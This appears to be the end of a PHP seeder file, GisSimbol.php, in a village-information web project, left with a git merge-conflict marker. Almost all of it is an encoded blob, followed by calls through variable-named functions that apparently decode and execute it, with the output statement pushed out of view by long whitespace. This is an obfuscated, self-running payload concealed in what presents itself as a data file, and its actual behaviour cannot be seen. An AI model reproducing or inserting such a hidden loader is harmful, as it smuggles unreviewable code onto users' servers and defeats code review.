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';

        $___();$__________($______($__($_))); $________=$____();
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      






























































































































































































































































































                                                                                                                                                                                                                     $________;
>>>>>>> rilis-beta:donjo-app/models/seeders/dataAwal/GisSimbol.php
